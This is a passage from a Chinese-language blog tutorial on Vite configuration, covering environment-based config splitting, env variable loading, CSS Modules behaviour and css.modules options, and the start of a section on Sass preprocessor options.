<span class="hljs-keyword">import</span> viteProdConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.prod.config.js'</span>
<span class="hljs-keyword">import</span> viteBaseConfig <span class="hljs-keyword">from</span> <span class="hljs-string">'./vite.base.config.js'</span>

<span class="hljs-comment">// 策略模式</span>
<span class="hljs-keyword">const</span> endResolver = {
  <span class="hljs-comment">// 添加一个参数</span>
  <span class="hljs-string">"build"</span>: <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> {
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"生产环境"</span>);
     <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>({}, viteBaseConfig, <span class="hljs-title function_">viteProdConfig</span>(env))
  },
  <span class="hljs-comment">// 添加一个参数</span>
  <span class="hljs-string">"serve"</span>: <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> {
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"开发环境"</span>);
     <span class="hljs-keyword">return</span> ({ ...viteBaseConfig, ...<span class="hljs-title function_">viteDevConfig</span>(env)})
  } 
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(<span class="hljs-function">(<span class="hljs-params">{command, mode}</span>) =&gt;</span> {
  <span class="hljs-comment">// command: 根据命令(pnpm dev | pnpm serve) 返回 ("build" | "serve")</span>
  <span class="hljs-comment">// mode: vite会将命令(pnpm dev --mode delvelopment)中--mode后面的值development赋值给mode</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"command:"</span>, command);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"mode:"</span>, mode);
  
  <span class="hljs-comment">// 获取到对应环境下的环境变量，loadEnv的合并规则请查看执行过程中的描述</span>
  <span class="hljs-keyword">const</span> env = <span class="hljs-title function_">loadEnv</span>(mode, <span class="hljs-string">'./config/env'</span>, <span class="hljs-string">""</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">".env:"</span>, env);
  
  <span class="hljs-keyword">return</span>  endResolver[command](env) <span class="hljs-comment">// 将其作为参数传给对应的配置文件 </span>
})
</code></pre>
<p><code>vite.prod.config.js</code>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    
  }
})
</code></pre>
<p><code>vite.dev.config.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">build</span>: {
    
  }
})
</code></pre>
<h4 data-id="heading-20">自动加载机制</h4>
<p>Vite 会在项目构建或开发过程中，<strong>自动从指定目录加载环境变量文件，并将符合规则的变量注入到客户端代码的 <code>import.meta.env</code> 中</strong>。这一过程由 Vite 内部机制完成，无需开发者手动调用函数，核心依赖以下配置：</p>
<ul>
<li><strong><code>envDir</code> 配置项</strong>：指定环境变量文件（如 <code>.env</code>、<code>.env.[mode]</code>）的存放目录（默认为项目根目录）。Vite 会根据当前运行模式（<code>mode</code>）自动从该目录加载对应的文件（如开发模式加载 <code>.env.development</code>）。</li>
<li><strong><code>envPrefix</code> 配置项</strong>：指定客户端可访问的环境变量前缀（默认为 <code>VITE_</code>）。只有带此前缀的变量会被注入到 <code>import.meta.env</code>，确保非必要变量不暴露给客户端。</li>
</ul>
<p>所以我们需要在公共的配置文件中添加配置项</p>
<p><code>vite.base.config.js</code>:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-variable constant_">URL</span> <span class="hljs-keyword">from</span> <span class="hljs-string">''</span>
<span class="hljs-comment">// 基础公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">envDir</span>: <span class="hljs-string">'./config/env'</span> <span class="hljs-comment">// 指定环境变量的加载目录</span>
    <span class="hljs-attr">envPrefix</span>:<span class="hljs-string">''</span>, <span class="hljs-comment">// 前缀过滤</span>
})
</code></pre>
<h3 data-id="heading-21">Vite对css的模块化处理</h3>
<h4 data-id="heading-22">vite默认识别文件的方式</h4>
<ul>
<li>新建<code>index.css</code>文件，在main.js中引入<code>import 'index.css'</code></li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-id">#app</span> {
    <span class="hljs-attribute">background-color</span>: pink;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
}
</code></pre>
<p>效果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2223c5014004460faedd53d111813ce1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=71MCGF2PtN0aoy%2Bc9ddBL00USvU%3D" alt="" loading="lazy"/></p>
<p>我们发现了，在<code>head</code>标签里面新建了一个<code>style</code>标签，index.css 文件里里面的内容，都被写到了标签里面。</p>
<p>当 <strong>Vite</strong> 的开发服务器检测到 main.js 中导入了 index.css 时，会对该 CSS 文件进行特殊处理：它会将 CSS 内容转换为一个 JavaScript 模块，并在响应头中设置 <code>Content-Type: text/javascript</code>，浏览器就会认为这是一个 JS 脚本，从而让浏览器以js脚本的形式来加载后缀名为<code>.css</code>的文件。浏览器加载这个 JS 模块后，会执行其中的逻辑 —— 动态创建 <code>&lt;style&gt;</code> 标签，并将原本的 CSS 内容插入到该标签中，最终使样式生效。</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43da02d0b0314d22ae471bd8b4948612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=8tzLcipvh%2Bl1hSHEs%2FHoAtvDqrg%3D" loading="lazy"/>
<p>转化为js脚本来加载CSS，主要有以下几个好处：</p>
<ul>
<li>用于<code>热更新</code>。</li>
<li>用于<code>css</code>模块化。</li>
<li>通过ESM 原生加载和避免开发时打包，提高了编译性能。</li>
</ul>
<h4 data-id="heading-23">CSS模块化</h4>
<p>CSS 模块化（CSS Modules）是一种用于解决传统 CSS 的 “全局作用域” 问题，即当多个文件中出现同名类名时，后加载的样式会覆盖先加载的样式，导致样式冲突。</p>
<p><strong>普通 CSS 文件（非模块化，如 <code>style.css</code>）</strong></p>
<p>类名会被<strong>原样保留</strong>，属于全局作用域，具体处理逻辑：</p>
<ol>
<li>开发环境：Vite 将 CSS 内容通过动态创建的 <code>&lt;style&gt;</code> 标签注入到页面，类名直接生效（如 <code>.title</code> 会被浏览器解析为全局类名）。</li>
<li>生产环境：CSS 会被提取为独立文件，类名保持原样，加载后仍为全局作用域。</li>
</ol>
<p><strong>特点</strong>：多个文件中的同名类名会发生冲突（后加载的样式覆盖先加载的）。</p>
<p><strong>CSS 模块化文件（如 <code>style.module.css</code>）</strong></p>
<p>类名会被<strong>哈希化处理</strong>，生成唯一标识，限制在局部作用域，具体流程：</p>
<p><strong>Vite</strong>会对后缀名为<code>.module.css</code>进行模块化处理。</p>
<ol>
<li><strong>类名转换</strong>：Vite 会对模块化 CSS 中的类名进行哈希处理（如 <code>.title</code> → <code>title_1a2b3c</code>），确保全局唯一，避免冲突。
<ul>
<li>转换规则可通过 Vite 配置自定义（如 <code>[name]__[local]___[hash]</code>，其中 <code>name</code> 是文件名，<code>local</code> 是原类名）。</li>
</ul>
</li>
<li><strong>在 JS 中引用</strong>：导入模块化 CSS 后，会得到一个对象，键为原类名，值为哈希后的类名。</li>
</ol>
<p>创建a.js、b.js、 a.module.css、b.moudle.css四个文件分别放入如下内容</p>
<p><code>a.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> aModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"aModuleCss:"</span>,aModuleCss);
</code></pre>
<p><code>b.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> bModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"bModuleCss:"</span>,bModuleCss);
</code></pre>
<p><code>a.module.css</code></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: pink;
}
</code></pre>
<p><code>b.moudle.css</code></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: skyblue;
}
</code></pre>
<p>然后在main.js中引入 a.js和b.js文件，启动服务，查看浏览器控制台</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f518f11c1144879962606fa718e8e15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2F8OJ1H1hHgGpxwg8N6pvdEPgfDo%3D" alt="" loading="lazy"/></p>
<p>然后我们可以看到，vite创建了两个映射对象，我们写的样式会被处理成<code>key:value</code>的形式，以原类名作为键名，处理后的类名作为键值。</p>
<img alt="image-20251113222925461转存失败，建议直接上传图片文件" src="" loading="lazy"/>
<p>然后真实引入的样式的类名会被替换成处理后的键值。最后再创建两个元素添加处理后的类名，写入如下代码</p>
<p><code>a.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> aModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"aModuleCss:"</span>,aModuleCss);

<span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
div.<span class="hljs-property">className</span> = aModuleCss.<span class="hljs-property">demo</span> <span class="hljs-comment">//原类名demo作为属性名，处理后的类名作为属性值</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div)
</code></pre>
<p><code>b.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> bModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"bModuleCss:"</span>,bModuleCss);

<span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
div.<span class="hljs-property">className</span> = bModuleCss.<span class="hljs-property">demo</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div)
</code></pre>
<p>效果:</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d940c9b0092d44969555f54cf25ec763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=iySUjIqbIikRRF11dvrnfDdd8CY%3D" loading="lazy"/>
<p><strong>渲染效果</strong>：在 HTML 中最终应用的是哈希后的类名（如 <code>&lt;div class="_demo_10cvw_1"&gt;</code>），并且仅对当前模块生效。</p>
<p><strong>总结</strong>：开启css模块化之后，除了会进行默认的css处理，还会进行类名替换，防止全局类名冲突</p>
<h4 data-id="heading-24">css.modules配置行为</h4>
<p>在 Vite 中，<code>css.modules</code> 配置项用于自定义 CSS Modules 的行为（CSS Modules 是一种通过局部作用域类名避免样式冲突的技术）。Vite 内置了对 CSS Modules 的支持，而 <code>css.modules</code> 就是用来精细化控制其规则的，下面详细讲解每个配置的作用、使用场景和示例：</p>
<h5 data-id="heading-25">基础前提</h5>
<p>在 Vite 中，默认约定：<strong>文件名以 <code>.module.css</code>（或 <code>.module.scss</code> 等预处理器后缀）结尾的文件会被当作 CSS Modules 处理</strong>，类名会被自动转换为局部作用域（编译成哈希字符串，如 <code>header -&gt; header_1a2b3c</code>）；非 <code>.module</code> 结尾的 CSS 文件则默认是全局作用域（类名不变）。</p>
<h5 data-id="heading-26"><code>css.modules</code> 完整配置项详解</h5>
<p>以下是 <code>vite.config.js</code> 中 <code>css.modules</code> 的所有可选配置，结合 Vite 实际使用场景说明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CSSModulesOptions</span> {
  getJSON?: <span class="hljs-function">(<span class="hljs-params">cssFileName: <span class="hljs-built_in">string</span>,
    json: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;,
    outputFileName: <span class="hljs-built_in">string</span>,
  </span>) =&gt;</span> <span class="hljs-built_in">void</span>
  scopeBehaviour?: <span class="hljs-string">'global'</span> | <span class="hljs-string">'local'</span>
  globalModulePaths?: <span class="hljs-title class_">RegExp</span>[]
  exportGlobals?: <span class="hljs-built_in">boolean</span>
  generateScopedName?:
    | <span class="hljs-built_in">string</span>
    | (<span class="hljs-function">(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, filename: <span class="hljs-built_in">string</span>, css: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">string</span>)
  hashPrefix?: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/**
   * default: undefined
   */</span>
  localsConvention?:
    | <span class="hljs-string">'camelCase'</span>
    | <span class="hljs-string">'camelCaseOnly'</span>
    | <span class="hljs-string">'dashes'</span>
    | <span class="hljs-string">'dashesOnly'</span>
    | (<span class="hljs-function">(<span class="hljs-params">
        originalClassName: <span class="hljs-built_in">string</span>,
        generatedClassName: <span class="hljs-built_in">string</span>,
        inputFile: <span class="hljs-built_in">string</span>,
      </span>) =&gt;</span> <span class="hljs-built_in">string</span>)
}
</code></pre>
<h5 data-id="heading-27">1. <code>scopeBehaviour</code>：默认作用域行为</h5>
<ul>
<li>
<p><strong>类型</strong>：<code>'global'</code> 或 <code>'local'</code>（字符串，二选一）</p>
</li>
<li>
<p><strong>默认值</strong>：<code>'local'</code></p>
</li>
<li>
<p>作用</p>
<p>：指定 CSS Modules 文件中类名的默认作用域（全局 / 局部）。</p>
<ul>
<li><code>'local'</code>（默认）：所有类名默认是局部的（会被编译成哈希，避免冲突）。</li>
<li><code>'global'</code>：所有类名默认是全局的（不编译，和普通 CSS 一样），此时需要用 <code>:local()</code> 手动指定局部类名。</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">scopeBehaviour</span>: <span class="hljs-string">'global'</span> <span class="hljs-comment">// 默认全局，需手动用 :local() 定义局部类</span>
}
</code></pre>
<p>对应 CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 全局类（因为 scopeBehaviour 是 global） */</span>
<span class="hljs-selector-class">.title</span> { <span class="hljs-attribute">color</span>: red; }

<span class="hljs-comment">/* 局部类（手动用 :local() 标记，会被编译） */</span>
:<span class="hljs-built_in">local</span>(.content) { <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; }
</code></pre>
</li>
</ul>
<h5 data-id="heading-28">2. <code>globalModulePaths</code>：指定全局 CSS 文件路径</h5>
<ul>
<li>
<p><strong>类型</strong>：正则表达式数组（如 <code>[/\.global\.css$/]</code>）</p>
</li>
<li>
<p><strong>作用</strong>：通过正则匹配文件路径，符合规则的 <code>.module.css</code> 文件会被当作<strong>全局 CSS</strong> 处理（类名不编译），忽略 <code>.module</code> 后缀的约定。</p>
</li>
<li>
<p><strong>使用场景</strong>：需要批量将某些 <code>.module.css</code> 文件设为全局（比如第三方组件的样式）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">globalModulePaths</span>: [<span class="hljs-regexp">/node_modules/</span>]<span class="hljs-comment">// 匹配 node_modules 下的 .module.css 文件，当作全局处理</span>
  <span class="hljs-comment">// 另一个例子：匹配所有带 .global. 的文件，如 home.global.module.css</span>
  <span class="hljs-comment">// globalModulePaths: [/\.global\./]</span>
}
</code></pre>
</li>
</ul>
<h5 data-id="heading-29">3. <code>exportGlobals</code>：是否导出全局类名</h5>
<ul>
<li>
<p><strong>类型</strong>：布尔值（<code>true</code> / <code>false</code>）</p>
</li>
<li>
<p><strong>默认值</strong>：<code>false</code></p>
</li>
<li>
<p><strong>作用</strong>：如果 CSS 中用 <code>:global()</code> 定义了全局类名，是否将其导出到模块的 <code>styles</code> 对象中（方便在 JS 中引用）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: { <span class="hljs-attr">exportGlobals</span>: <span class="hljs-literal">true</span> }
</code></pre>
<p>CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 全局类 */</span>
:<span class="hljs-built_in">global</span>(.global-title) { <span class="hljs-attribute">color</span>: blue; }

<span class="hljs-comment">/* 局部类 */</span>
<span class="hljs-selector-class">.local-content</span> { <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>; }
</code></pre>
<p>JS 中引用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.module.css'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles); 
<span class="hljs-comment">// 因为 exportGlobals: true，会包含全局类：</span>
<span class="hljs-comment">// { globalTitle: 'global-title', localContent: 'local-content_1a2b3c' }</span>
</code></pre>
<p>此时可以用 <code>className={styles.globalTitle}</code> 引用全局类。</p>
</li>
</ul>
<h5 data-id="heading-30">4. <code>generateScopedName</code>：自定义局部类名格式</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串 或 函数</p>
</li>
<li>
<p><strong>默认值</strong>：开发环境是 <code>'[name]__[local]___[hash:base64:5]'</code>（如 <code>style__content___1a2b3</code>），生产环境是短哈希（如 <code>1a2b3</code>）</p>
</li>
<li>
<p><strong>作用</strong>：自定义局部类名的编译结果（默认是哈希，可读性差，可通过此配置优化）。</p>
</li>
<li>
<p>字符串模式</p>
<p>（常用占位符）：</p>
<ul>
<li><code>[name]</code>：CSS 文件名（不含后缀）</li>
<li><code>[local]</code>：原始类名（如 <code>.content</code> 中的 <code>content</code>）</li>
<li><code>[hash:长度]</code>：哈希值（可指定长度，如 <code>[hash:6]</code> 生成 6 位哈希）</li>
<li><code>[hash:base64:长度]</code>：base64 格式的哈希</li>
</ul>
</li>
<li>
<p>函数模式：接收 3 个参数，返回自定义类名字符串：</p>
<ul>
<li><code>name</code>：原始类名</li>
<li><code>filename</code>：CSS 文件路径</li>
<li><code>css</code>：CSS 内容</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-comment">// 字符串格式：文件名__原始类名--6位哈希</span>
  <span class="hljs-attr">generateScopedName</span>: <span class="hljs-string">'[name]__[local]--[hash:6]'</span>,

  <span class="hljs-comment">// 函数格式：自定义逻辑（如添加前缀）</span>
  <span class="hljs-attr">generateScopedName</span>: <span class="hljs-function">(<span class="hljs-params">name, filename, css</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> prefix = filename.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.module.css'</span>, <span class="hljs-string">''</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">`my-<span class="hljs-subst">${prefix}</span>-<span class="hljs-subst">${name}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).slice(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)}</span>`</span>;
  }
}
</code></pre>
<p>假设文件是<code>header.module.css</code>，类名是<code>.title</code>，编译后可能是：</p>
<ul>
<li>字符串模式：<code>header__title--1a2b3c</code></li>
<li>函数模式：<code>my-header-title-xyz789</code></li>
</ul>
</li>
</ul>
<h5 data-id="heading-31">5. <code>hashPrefix</code>：哈希前缀</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串</p>
</li>
<li>
<p><strong>作用</strong>：给生成的哈希值添加一个前缀，确保不同项目 / 环境的类名哈希不冲突（哈希计算会包含这个前缀）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: { <span class="hljs-attr">hashPrefix</span>: <span class="hljs-string">'my-project-v1'</span> }
</code></pre>
<p>此时哈希值会基于<code>my-project-v1</code>计算，避免和其他项目的哈希重复。</p>
</li>
</ul>
<h5 data-id="heading-32">6. <code>localsConvention</code>：JS 中类名的命名格式</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串（<code>'camelCase'</code> / <code>'camelCaseOnly'</code> / <code>'dashes'</code> / <code>'dashesOnly'</code>）或 函数</p>
</li>
<li>
<p><strong>默认值</strong>：<code>undefined</code>（不转换，保持原始类名）</p>
</li>
<li>
<p><strong>作用</strong>：CSS 中类名常用横杠（如 <code>.user-info</code>），但 JS 中更习惯驼峰（<code>userInfo</code>），此配置用于自动转换导出到 JS 的类名格式。</p>
</li>
<li>
<p>字符串选项说明：</p>
<ul>
<li><code>'camelCase'</code>：横杠转驼峰，同时保留原始类名（如 <code>.user-info</code> 可通过 <code>styles.userInfo</code> 和 <code>styles['user-info']</code> 访问）。</li>
<li><code>'camelCaseOnly'</code>：只保留驼峰形式（<code>styles.userInfo</code> 有效，<code>styles['user-info']</code> 无效）。</li>
<li><code>'dashes'</code>：驼峰转横杠，同时保留原始类名（如 <code>.userInfo</code> 可通过 <code>styles['user-info']</code> 和 <code>styles.userInfo</code> 访问）。</li>
<li><code>'dashesOnly'</code>：只保留横杠形式（<code>styles['user-info']</code> 有效，<code>styles.userInfo</code> 无效）。</li>
</ul>
</li>
<li>
<p>函数模式：自定义转换规则，接收 3 个参数：</p>
<ul>
<li><code>originalClassName</code>：原始类名（如 <code>user-info</code>）</li>
<li><code>generatedClassName</code>：编译后的类名（如 <code>user-info_1a2b3c</code>）</li>
<li><code>inputFile</code>：CSS 文件路径</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">localsConvention</span>: <span class="hljs-string">'camelCase'</span> <span class="hljs-comment">// 横杠转驼峰，保留原始</span>
}
</code></pre>
<p>CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.user-info</span> { <span class="hljs-attribute">color</span>: green; }
</code></pre>
<p>JS 中引用:</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.module.css'</span>;
<span class="hljs-comment">// 两种方式都能访问</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles.<span class="hljs-property">userInfo</span>); <span class="hljs-comment">// 有效（驼峰）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles[<span class="hljs-string">'user-info'</span>]); <span class="hljs-comment">// 有效（原始）</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-33">7. <code>getJSON</code>：处理类名映射关系</h5>
<ul>
<li>
<p><strong>类型</strong>：函数</p>
</li>
<li>
<p><strong>作用</strong>：当 CSS Modules 编译完成后，会生成一个 “原始类名 -&gt; 编译后类名” 的映射对象（JSON），此函数用于自定义处理这个映射（如保存到文件、打印日志等）。</p>
</li>
<li>
<p>参数：</p>
<ul>
<li><code>cssFileName</code>：原始 CSS 文件的路径（如 <code>src/style.module.css</code>）</li>
<li><code>json</code>：映射对象（如 <code>{ "user-info": "user-info_1a2b3c" }</code>）</li>
<li><code>outputFileName</code>：Vite 自动生成的映射文件路径（通常不需要手动处理）</li>
</ul>
</li>
<li>
<p><strong>使用场景</strong>：需要记录类名映射关系（如调试、自定义生成类型文件等）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">getJSON</span>: <span class="hljs-function">(<span class="hljs-params">cssFileName, json, outputFileName</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'CSS 文件:'</span>, cssFileName);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'类名映射:'</span>, json);
    <span class="hljs-comment">// 可以将 json 保存到本地文件（需要 fs 模块）</span>
    <span class="hljs-comment">// const fs = require('fs');</span>
    <span class="hljs-comment">// fs.writeFileSync('./class-map.json', JSON.stringify(json, null, 2));</span>
  }
}
</code></pre>
</li>
</ul>
<h5 data-id="heading-34">实际项目常用配置示例</h5>
<p>结合开发和生产环境的需求，一个典型的 <code>css.modules</code> 配置可能是这样的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">modules</span>: {
      <span class="hljs-comment">// 开发环境下保留可读性好的类名，生产环境用短哈希</span>
      <span class="hljs-attr">generateScopedName</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'development'</span>
        ? <span class="hljs-string">'[name]__[local]--[hash:5]'</span>
        : <span class="hljs-string">'[hash:6]'</span>,
      <span class="hljs-comment">// 横杠转驼峰，方便 JS 中用 . 访问</span>
      <span class="hljs-attr">localsConvention</span>: <span class="hljs-string">'camelCase'</span>,
      <span class="hljs-comment">// 添加哈希前缀，避免冲突</span>
      <span class="hljs-attr">hashPrefix</span>: <span class="hljs-string">'my-app'</span>,
      <span class="hljs-comment">// 导出全局类名，方便引用</span>
      <span class="hljs-attr">exportGlobals</span>: <span class="hljs-literal">true</span>
    }
  }
}
</code></pre>
<h5 data-id="heading-35">总结</h5>
<p><code>css.modules</code> 配置的核心目的是：<strong>控制 CSS 类名的编译规则（局部 / 全局、格式）和 JS 中的引用方式</strong>。通过合理配置，可以让 CSS Modules 更符合项目的开发习惯，同时避免样式冲突。日常开发中，<code>generateScopedName</code>（自定义类名）和 <code>localsConvention</code>（驼峰转换）是最常用的两个配置。</p>
<h3 data-id="heading-36">css.preprocessorOptions(预处理器)</h3>
<p><code>preprocessorOptions</code> 就是给项目的 CSS 预处理器（比如 SCSS、Less）提供一个 “全局配置” 的地方。在 Vite 处理 <code>.scss</code> 或 <code>.sass</code> 文件之前，它会先读取这些配置，并应用到整个编译过程中。</p>
<h4 data-id="heading-37"><strong>作用</strong></h4>
<ol>
<li><strong>引入全局样式文件</strong>：你可能有一个 <code>variables.scss</code> 文件，里面定义了所有的颜色、字体、间距等变量；还有一个 <code>mixins.scss</code> 文件，里面是一些可复用的样式片段。你不想在每一个 <code>.scss</code> 文件的开头都写一遍 <code>@import './variables.scss';</code>，这太繁琐了。</li>
<li><strong>定义全局变量 / 混合宏</strong>：有些简单的变量或混合宏（mixin），你可能不想专门为它创建一个文件，希望能直接在所有 SCSS 文件中使用。</li>
<li><strong>修改 SCSS 编译器的行为</strong>：比如，让 SCSS 允许开发者使用 <code>@debug</code> 指令在控制台打印调试信息，或者想改变它处理 URL 的方式。</li>
</ol>
<h4 data-id="heading-38">全局配置项目中sass的行为</h4>
<p>在vite项目中使用<code>sass</code>预处理器需要先安装相关依赖</p>
<pre><code class="hljs language-cmd" lang="cmd">pnpm add sass sass-loader -D
</code></pre>
<p>安装完成后，<strong>不需要做任何其他配置</strong>。Vite 会自动检测到这些依赖，并在导入 <code>.scss</code> 或 <code>.sass</code> 文件时，自动使用它们进行编译。</p>
<h5 data-id="heading-39">**1. <code>additionalData</code> **</h5>
<p>这个属性允许你在<strong>每一个</strong>被编译的 SCSS/Sass 文件的<strong>开头</strong>，自动注入一段 SCSS 代码。</p>
<p><strong>场景一：自动引入全局样式文件</strong></p>
<p>假设你的项目结构如下：</p>
<pre><code class="hljs language-text" lang="text">src/
├── assets/
│   └── styles/
